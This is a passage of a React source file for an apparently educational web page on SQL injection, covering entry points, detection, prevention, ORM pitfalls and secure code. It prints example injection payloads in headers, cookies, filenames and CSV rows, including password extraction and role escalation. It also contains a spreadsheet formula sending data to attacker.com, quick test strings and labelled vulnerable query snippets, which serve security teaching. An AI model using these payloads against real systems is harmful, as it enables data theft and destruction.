Contact Form (stored for later viewing):
Name: John'; DROP TABLE messages--
(This might execute when admin views messages)`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
                  <Typography sx={{ fontWeight: 600 }}>HTTP Headers</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    Applications often log HTTP headers for analytics or security purposes. If these logged values are
                    later used in queries (e.g., "show me all visits from this IP"), they become injection points.
                  </Typography>
                  <CodeBlock
                    language="text"
                    code={`User-Agent Header (logged for analytics):
User-Agent: Mozilla/5.0' OR '1'='1'--

X-Forwarded-For Header (logged for IP tracking):
X-Forwarded-For: 192.168.1.1' UNION SELECT password FROM users WHERE username='admin'--

Referer Header (logged for marketing):
Referer: https://google.com'; DELETE FROM logs WHERE '1'='1

Cookie (preferences stored in DB):
Cookie: theme=dark'; UPDATE users SET role='admin' WHERE username='attacker'--`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
                  <Typography sx={{ fontWeight: 600 }}>File Uploads and Imports</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    When users upload files, the filename is often stored in a database. When bulk data is imported
                    from CSV or Excel files, each cell value might be inserted via SQL queries.
                  </Typography>
                  <CodeBlock
                    language="text"
                    code={`Malicious Filename:
profile_photo'; DROP TABLE users--.jpg
(Filename stored in database, might execute during listing)

CSV Import Attack (each row becomes an INSERT):
Name,Email,Phone
John,john@test.com,555-1234
'; DELETE FROM users--,fake@test.com,555-0000
(The Name field contains malicious SQL)

Excel Import with Formula:
Cell A1: =WEBSERVICE("http://attacker.com/"&A2)
(Could exfiltrate data if formulas are processed)`}
                  />
                </AccordionDetails>
              </Accordion>

              <Alert severity="warning" sx={{ mt: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Remember: Second-Order Injection</AlertTitle>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  Even if input is safely stored initially, it can cause injection later if used unsafely. Example: A user
                  registers with username <code>admin'--</code>. The registration uses parameterized queries (safe!). But later,
                  an admin panel displays users with a vulnerable query - now the stored username triggers injection.
                  <strong> Rule: Parameterize queries even when using data from your own database.</strong>
                </Typography>
              </Alert>

              <Alert severity="info" sx={{ mt: 2, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Testing Checklist for Entry Points</AlertTitle>
                <List dense>
                  <ListItem><ListItemText primary="1. Identify all inputs: forms, URLs, headers, cookies, files, APIs" /></ListItem>
                  <ListItem><ListItemText primary="2. Trace each input: Does it reach a database query? How is it used?" /></ListItem>
                  <ListItem><ListItemText primary={`3. Test with special characters: ' " ; -- # /* to see if errors occur`} /></ListItem>
                  <ListItem><ListItemText primary="4. Check for differences: Does changing input change the response in unexpected ways?" /></ListItem>
                  <ListItem><ListItemText primary="5. Don't forget stored data: Test what happens when stored data is retrieved and used" /></ListItem>
                </List>
              </Alert>
            </Paper>

            {/* ========== SECTION: DETECTION ========== */}
            <Paper
              id="detection"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <SearchIcon sx={{ color: accent }} />
                Detection & Indicators
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                How do you know if someone is attempting SQL injection against your application? Or if you're testing,
                how do you confirm a vulnerability exists? Detection involves looking for specific signals and patterns
                that indicate SQL injection attempts or successful exploitation.
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                There are two perspectives on detection: <strong>as a tester/attacker</strong> (looking for signs that injection
                is possible) and <strong>as a defender</strong> (monitoring for attack attempts). Let's cover both:
              </Typography>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                For Testers: Signs That SQLi Might Work
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                When testing an application (with authorization!), these signals suggest a SQL injection vulnerability exists:
              </Typography>

              <Grid container spacing={3} sx={{ mb: 4 }}>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#ef4444", 0.03), height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
                      Error-Based Signals
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
                      The application reveals database errors:
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="SQL syntax error messages appear" secondary="Any mention of SQL, syntax, or query errors" /></ListItem>
                      <ListItem><ListItemText primary="500 Internal Server Error" secondary={`Especially when adding ' or " to input`} /></ListItem>
                      <ListItem><ListItemText primary="Stack traces mention database" secondary="JDBC, MySQL, psycopg2, etc. in error" /></ListItem>
                      <ListItem><ListItemText primary="Connection/timeout errors" secondary="Database connection issues after input" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#f59e0b", 0.03), height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
                      Behavioral Signals
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
                      The application behaves differently:
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="Different content for true/false" secondary="Adding AND 1=1 vs AND 1=2 changes response" /></ListItem>
                      <ListItem><ListItemText primary="Response time changes" secondary="Adding SLEEP(5) makes response 5s slower" /></ListItem>
                      <ListItem><ListItemText primary="More/fewer results returned" secondary="UNION queries add extra rows" /></ListItem>
                      <ListItem><ListItemText primary="Unexpected data appears" secondary="Data from other tables shows up" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#22c55e", 0.03), height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                      Quick Tests to Try
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
                      Simple inputs to test for SQLi:
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="Single quote: '" secondary="Should cause syntax errors if vulnerable" /></ListItem>
                      <ListItem><ListItemText primary={`Double quote: "`} secondary="Alternative string delimiter" /></ListItem>
                      <ListItem><ListItemText primary="Comment: ' OR 1=1--" secondary="Classic bypass test" /></ListItem>
                      <ListItem><ListItemText primary="Sleep: ' AND SLEEP(5)--" secondary="Check for time delay" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                For Defenders: Monitoring for Attacks
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                If you're responsible for security, monitor these signals in your logs and systems:
              </Typography>

              <Grid container spacing={3} sx={{ mb: 3 }}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#3b82f6", 0.03) }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                      Application & Web Server Logs
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary={`Requests containing ' " ; -- # /*`} secondary="SQL metacharacters in parameters" /></ListItem>
                      <ListItem><ListItemText primary="Keywords: UNION, SELECT, INSERT, DELETE, DROP" secondary="SQL commands in user input" /></ListItem>
                      <ListItem><ListItemText primary="Encoded variants: %27 %22 %3B" secondary="URL-encoded SQL characters" /></ListItem>
                      <ListItem><ListItemText primary="Repeated errors from same IP" secondary="Automated scanning behavior" /></ListItem>
                      <ListItem><ListItemText primary="Unusual parameter values" secondary="Very long strings, binary data, special chars" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03) }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                      Database Logs & Monitoring
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="Queries to system tables" secondary="information_schema, sysobjects, pg_tables" /></ListItem>
                      <ListItem><ListItemText primary="UNION SELECT in query logs" secondary="Unusual query patterns" /></ListItem>
                      <ListItem><ListItemText primary="Syntax errors spike" secondary="Sudden increase in malformed queries" /></ListItem>
                      <ListItem><ListItemText primary="Outbound connections from DB" secondary="OOB attack indicator" /></ListItem>
                      <ListItem><ListItemText primary="Large data reads" secondary="Bulk extraction attempts" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4 }}>
                Database Error Signatures by Platform
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Different databases produce different error messages. Recognizing these helps identify which database
                you're dealing with (useful for both testers and defenders):
              </Typography>

              <TableContainer component={Paper} sx={{ borderRadius: 2 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: alpha(accent, 0.1) }}>
                      <TableCell sx={{ fontWeight: 700 }}>Database</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Typical Error Pattern</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>What It Tells You</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {[
                      { db: "MySQL", error: "You have an error in your SQL syntax; near ...", info: "Shows exact position of error" },
                      { db: "PostgreSQL", error: "ERROR: syntax error at or near ...", info: "Includes line number and position" },
                      { db: "MSSQL", error: "Unclosed quotation mark after the character string", info: "Often reveals query structure" },
                      { db: "Oracle", error: "ORA-01756: quoted string not properly terminated", info: "ORA codes identify error type" },
                      { db: "SQLite", error: "SQLite error: near \"...\": syntax error", info: "Lightweight, file-based DB" },
                    ].map((row) => (
                      <TableRow key={row.db}>
                        <TableCell sx={{ fontWeight: 600 }}>{row.db}</TableCell>
                        <TableCell sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>{row.error}</TableCell>
                        <TableCell sx={{ fontSize: "0.85rem" }}>{row.info}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              <Alert severity="info" sx={{ mt: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Detection vs. Prevention</AlertTitle>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  Detection is important for identifying attacks, but it's reactive. The best approach is <strong>prevention
                  through parameterized queries</strong>. Even if your detection misses something, proper parameterization
                  means the attack won't work. Think of detection as your security camera - useful, but the lock on the door
                  (parameterization) is what actually keeps intruders out.
                </Typography>
              </Alert>
            </Paper>

            {/* ========== SECTION: PREVENTION ========== */}
            <Paper
              id="prevention"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <ShieldIcon sx={{ color: accent }} />
                Prevention Strategies
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Here's the good news: SQL injection is one of the most <strong>preventable</strong> vulnerabilities in web security.
                Unlike some complex attacks that require layered defenses, SQLi has a clear, reliable solution that works
                every time: <strong>parameterized queries</strong> (also called prepared statements).
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                The key principle is simple: <strong>never treat user input as part of the SQL command</strong>. Always keep
                data and code completely separate. Let's explore the various prevention strategies from most to least effective:
              </Typography>

              {/* Primary Defense */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                  Primary Defense: Parameterized Queries
                </Typography>
                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                  This is the <strong>#1 defense</strong> and should be used everywhere. With parameterized queries, you tell the
                  database "here's the SQL structure" and separately "here's the data to use." The database knows which is which
                  and will never execute data as code.
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>Instead of this (VULNERABLE):</Typography>
                    <CodeBlock
                      language="javascript"
                      code={`// BAD: String concatenation
query = "SELECT * FROM users WHERE id = " + userId;
query = "SELECT * FROM users WHERE name = '" + name + "'";
query = \`SELECT * FROM users WHERE email = '\${email}'\`;`}
                    />
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>Do this (SECURE):</Typography>
                    <CodeBlock
                      language="javascript"
                      code={`// GOOD: Parameterized queries
query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId]);

query = "SELECT * FROM users WHERE name = $1";
db.query(query, [name]);`}
                    />
                  </Grid>
                </Grid>
              </Paper>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
                Prevention Checklist by Priority
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Use this checklist to ensure comprehensive protection. Critical items are non-negotiable:
              </Typography>

              <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 4 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: alpha(accent, 0.1) }}>
                      <TableCell sx={{ fontWeight: 700, width: 100 }}>Priority</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Action Item</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Why It Matters</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {[
                      { priority: "Critical", item: "Use parameterized queries everywhere", why: "Fundamental fix that prevents all SQLi" },
                      { priority: "Critical", item: "Never concatenate user input into SQL", why: "Root cause of SQLi vulnerabilities" },
                      { priority: "High", item: "Validate data types and use allowlists", why: "Catches invalid input early" },
                      { priority: "High", item: "Limit database account permissions", why: "Reduces damage if SQLi succeeds" },
                      { priority: "High", item: "Hide SQL errors from users", why: "Prevents information leakage" },
                      { priority: "Medium", item: "Keep ORM and drivers up to date", why: "Patches known vulnerabilities" },
                      { priority: "Medium", item: "Log and alert on SQL errors", why: "Enables attack detection" },
                      { priority: "Medium", item: "Use WAF as additional layer", why: "Catches known attack patterns" },
                      { priority: "Medium", item: "Network segmentation for DB", why: "Limits blast radius of breach" },
                      { priority: "Medium", item: "Regular code reviews and SAST", why: "Finds vulnerabilities before production" },
                    ].map((row, idx) => (
                      <TableRow key={idx}>
                        <TableCell>
                          <Chip
                            label={row.priority}
                            size="small"
                            sx={{
                              bgcolor: row.priority === "Critical" ? alpha("#ef4444", 0.15) :
                                       row.priority === "High" ? alpha("#f59e0b", 0.15) : alpha("#3b82f6", 0.15),
                              color: row.priority === "Critical" ? "#ef4444" :
                                     row.priority === "High" ? "#f59e0b" : "#3b82f6",
                              fontWeight: 600,
                            }}
                          />
                        </TableCell>
                        <TableCell sx={{ fontWeight: 500 }}>{row.item}</TableCell>
                        <TableCell sx={{ color: "text.secondary", fontSize: "0.85rem" }}>{row.why}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
                Understanding the Defenses
              </Typography>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                      Why Parameterization Works
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                      Parameterized queries work because they fundamentally change how queries are processed:
                    </Typography>
                    <List dense>
                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Database parses SQL structure FIRST" secondary="Before any user data is introduced" /></ListItem>
                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Parameters sent separately" secondary="Data travels in a different channel than code" /></ListItem>
                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Typed as data, not code" secondary="Database knows parameters are values, not commands" /></ListItem>
                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Performance bonus" secondary="Query plans can be cached and reused" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
                      Why Escaping Is Not Enough
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                      Some developers try to "escape" special characters instead of parameterizing. This is risky:
                    </Typography>
                    <List dense>
                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Rules differ across databases" secondary="What works for MySQL may not work for PostgreSQL" /></ListItem>
                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Doesn't protect all contexts" secondary="ORDER BY, table names can't be escaped safely" /></ListItem>
                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Encoding bypasses" secondary="Double encoding, alternate charsets can bypass escaping" /></ListItem>
                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Easy to forget" secondary="One missed escape = vulnerability" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              <Accordion sx={{ mt: 3, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
                  <Typography sx={{ fontWeight: 700 }}>Special Case: Dynamic Column/Table Names</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    Parameterized queries can't be used for column names, table names, or ORDER BY clauses - only for data values.
                    For these cases, use a <strong>strict allowlist</strong>:
                  </Typography>
                  <CodeBlock
                    language="javascript"
                    code={`// User wants to sort by a column - can't parameterize column names
const userSortColumn = req.query.sort;  // User input

// BAD: Direct concatenation
const query = "SELECT * FROM products ORDER BY " + userSortColumn; // VULNERABLE!

// GOOD: Allowlist approach
const allowedColumns = ['name', 'price', 'created_at', 'rating'];
const sortColumn = allowedColumns.includes(userSortColumn) ? userSortColumn : 'created_at';
const query = "SELECT * FROM products ORDER BY " + sortColumn;  // Safe - column is from allowlist

// GOOD: Map approach (even safer)
const columnMap = { 'name': 'product_name', 'price': 'unit_price', 'date': 'created_at' };
const sortColumn = columnMap[userSortColumn] || 'created_at';
const query = "SELECT * FROM products ORDER BY " + sortColumn;  // Safe - mapped value`}
                  />
                </AccordionDetails>
              </Accordion>

              <Alert severity="success" sx={{ mt: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>The Bottom Line</AlertTitle>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  If you do just one thing: <strong>use parameterized queries for all database interactions</strong>.
                  This single practice prevents virtually all SQL injection attacks. Everything else (WAFs, input validation,
                  least privilege) is helpful defense-in-depth, but parameterization is the foundation.
                </Typography>
              </Alert>
            </Paper>

            {/* ========== SECTION: ORM PITFALLS ========== */}
            <Paper
              id="orm-pitfalls"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <MemoryIcon sx={{ color: accent }} />
                ORM and Query Builder Pitfalls
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                ORMs and query builders reduce SQL injection risk by encouraging parameterized queries, but they do not
                eliminate it. Most SQLi bugs appear when developers escape the ORM safety net and assemble raw SQL or
                dynamic identifiers.
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                Treat any API that accepts raw SQL, string templates, or dynamic column names as a high risk area.
                The safest approach is to keep all queries in a single data access layer and use strict allowlists
                for any dynamic pieces that cannot be parameterized.
              </Typography>

              <Grid container spacing={3} sx={{ mb: 3 }}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
                      Common ORM Pitfalls
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="Raw SQL helpers with string interpolation" secondary="queryRaw, whereRaw, literal, or raw()" /></ListItem>
                      <ListItem><ListItemText primary="Dynamic ORDER BY or column names from user input" secondary="Identifiers cannot be parameterized" /></ListItem>
                      <ListItem><ListItemText primary="Building WHERE clauses with string concatenation" secondary="Filters built from query strings or JSON" /></ListItem>
                      <ListItem><ListItemText primary="Stored procedures with dynamic SQL" secondary="EXEC or PREPARE inside procedures" /></ListItem>
                      <ListItem><ListItemText primary="Using ORM escape utilities as a replacement for parameters" secondary="Escaping is not a complete defense" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                      Safe ORM Patterns
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="Use parameter binding APIs for all values" secondary="where(), findMany(), prepared statements" /></ListItem>
                      <ListItem><ListItemText primary="Allowlist sort fields and map to internal column names" secondary="Never trust user input as identifiers" /></ListItem>
                      <ListItem><ListItemText primary="Centralize data access in a repository layer" secondary="Reduce ad-hoc raw SQL usage" /></ListItem>
                      <ListItem><ListItemText primary="Log SQL in non-production and review query patterns" secondary="Catch risky raw queries early" /></ListItem>
                      <ListItem><ListItemText primary="Use linting or code review to block string-built SQL" secondary="Automate enforcement" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
                Example: Unsafe Raw Query
              </Typography>
              <CodeBlock
                language="javascript"
                title="VULNERABLE: Raw SQL with string interpolation"
                code={`// User-controlled input
const sort = req.query.sort;
const email = req.query.email;

// DANGER: Raw query with interpolated values
const query = "SELECT * FROM users WHERE email = '" + email + "' ORDER BY " + sort;
db.query(query);`}
              />

              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
                Example: Safe Query Builder Pattern
              </Typography>
              <CodeBlock
                language="javascript"
                title="SECURE: Parameter binding with allowlist"
                code={`const email = req.query.email;
const sort = req.query.sort;

const allowedSorts = { name: "name", created: "created_at", status: "status" };
const sortColumn = allowedSorts[sort] || "created_at";

// Data is parameterized, identifiers are allowlisted
const query = "SELECT * FROM users WHERE email = ? ORDER BY " + sortColumn + " LIMIT ?";
db.query(query, [email, 100]);`}
              />

              <Alert severity="info" sx={{ mt: 2, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>ORMs Help, But They Are Not Magic</AlertTitle>
                Use ORM features as intended, avoid raw SQL unless absolutely necessary, and enforce allowlists for any
                dynamic identifiers. The same core rule applies: keep data and code separate.
              </Alert>
            </Paper>

            {/* ========== SECTION: SECURE CODE EXAMPLES ========== */}
            <Paper
              id="secure-code"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <LockIcon sx={{ color: accent }} />
                Secure Code Examples
              </Typography>

              <Typography variant="body1" sx={{ mb: 3 }}>
                Here are examples of parameterized queries in popular languages and frameworks.
                Always use these patterns instead of string concatenation.
              </Typography>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <CodeBlock
                    language="python"
                    title="Python (psycopg2)"
                    code={`# SECURE: parameterized query
query = "SELECT * FROM users WHERE email = %s"
cursor.execute(query, (email,))

# SECURE: named parameters
query = "SELECT * FROM users WHERE id = %(user_id)s"
cursor.execute(query, {"user_id": user_id})`}
                  />
                </Grid>
                <Grid item xs={12} md={6}>
                  <CodeBlock
                    language="javascript"
                    title="Node.js (pg)"
                    code={`// SECURE: parameterized query
const query = "SELECT * FROM users WHERE id = $1";
const result = await client.query(query, [userId]);

// Multiple parameters
const query = "SELECT * FROM users WHERE id = $1 AND status = $2";
const result = await client.query(query, [userId, status]);`}
                  />
                </Grid>
                <Grid item xs={12} md={6}>
                  <CodeBlock
                    language="java"
                    title="Java (PreparedStatement)"
                    code={`// SECURE: PreparedStatement
String sql = "SELECT * FROM users WHERE email = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, email);
ResultSet rs = ps.executeQuery();`}
                  />
                </Grid>
                <Grid item xs={12} md={6}>
                  <CodeBlock
                    language="csharp"
                    title="C# (SqlCommand)"
                    code={`// SECURE: parameterized query
var sql = "SELECT * FROM users WHERE email = @email";
var cmd = new SqlCommand(sql, conn);
cmd.Parameters.AddWithValue("@email", email);
var reader = cmd.ExecuteReader();`}
                  />
                </Grid>
                <Grid item xs={12}>
                  <CodeBlock
                    language="javascript"
                    title="Dynamic Filters (Safe Pattern)"
                    code={`// SECURE: Building dynamic WHERE clauses safely
const filters = [];
const params = [];

if (status) {
  filters.push("status = ?");
  params.push(status);
}

if (ownerId) {
  filters.push("owner_id = ?");
  params.push(ownerId);
}

const whereClause = filters.length ? "WHERE " + filters.join(" AND ") : "";
const sql = "SELECT * FROM tickets " + whereClause + " ORDER BY created_at DESC";
const rows = await db.query(sql, params);`}
                  />
                </Grid>
                <Grid item xs={12}>
                  <CodeBlock
                    language="javascript"
                    title="Safe ORDER BY with Allowlist"
                    code={`// SECURE: Allowlist for dynamic sorting
const allowedColumns = ["name", "created_at", "status", "priority"];
const sortColumn = allowedColumns.includes(sort) ? sort : "created_at";
const sortDir = order === "asc" ? "ASC" : "DESC";

// Column name is from allowlist, not user input
const query = \`SELECT * FROM tickets ORDER BY \${sortColumn} \${sortDir} LIMIT ?\`;
db.query(query, [limit]);`}
                  />
                </Grid>
              </Grid>
            </Paper>

            {/* ========== SECTION: DATABASE SPECIFICS ========== */}
            <Paper
              id="db-specific"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <StorageIcon sx={{ color: accent }} />
                Database-Specific Techniques
              </Typography>

              <Typography variant="body1" sx={{ mb: 3 }}>
                Each database system has unique syntax and functions. Understanding these differences is crucial
                for both testing and defense.
              </Typography>

              {dbSpecificTechniques.map((db) => (
                <Accordion key={db.database} sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                  <AccordionSummary
                    expandIcon={<ExpandMoreIcon />}
                    sx={{ background: alpha(db.color, 0.1), borderRadius: 2 }}
                  >
                    <Typography sx={{ fontWeight: 700, color: db.color }}>{db.database}</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Grid container spacing={2}>
                      <Grid item xs={12} md={6}>
                        <Typography variant="caption" sx={{ fontWeight: 700 }}>Version Query</Typography>
                        <Typography variant="body2" sx={{ fontFamily: "monospace", mb: 1 }}>{db.versionQuery}</Typography>

                        <Typography variant="caption" sx={{ fontWeight: 700 }}>Current User</Typography>
                        <Typography variant="body2" sx={{ fontFamily: "monospace", mb: 1 }}>{db.currentUser}</Typography>

                        <Typography variant="caption" sx={{ fontWeight: 700 }}>List Databases</Typography>
                        <Typography variant="body2" sx={{ fontFamily: "monospace", mb: 1, fontSize: "0.75rem" }}>{db.listDatabases}</Typography>
                      </Grid>
                      <Grid item xs={12} md={6}>
                        <Typography variant="caption" sx={{ fontWeight: 700 }}>List Tables</Typography>
                        <Typography variant="body2" sx={{ fontFamily: "monospace", mb: 1, fontSize: "0.75rem" }}>{db.listTables}</Typography>

                        <Typography variant="caption" sx={{ fontWeight: 700 }}>Time-Based Delay</Typography>
